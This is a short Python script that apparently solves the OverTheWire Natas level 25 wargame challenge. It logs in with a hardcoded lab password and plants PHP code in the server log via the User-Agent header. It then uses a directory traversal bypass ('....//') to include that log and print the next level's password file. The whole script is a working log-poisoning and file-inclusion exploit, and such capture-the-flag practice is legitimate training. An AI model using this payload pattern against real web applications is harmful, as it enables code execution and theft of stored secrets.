import requests

with requests.Session() as session:
    url = "http://natas25.natas.labs.overthewire.org"
    session.auth = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

    pwn_param = {
        "lang": "../",
    }

    pwn_header = {
        "User-Agent": "<? echo 'Natas 26 password: '; echo file_get_contents('/etc/natas_webpass/natas26'); ?>",
    }

    session.get(
        url,
        params=pwn_param,
        headers=pwn_header,
    )

    pwn_param = {
        "lang": f"....//logs/natas25_{session.cookies.get('PHPSESSID')}.log",
    }

    r = session.get(
        url,
        params=pwn_param,
    )

    print(r.content.decode())
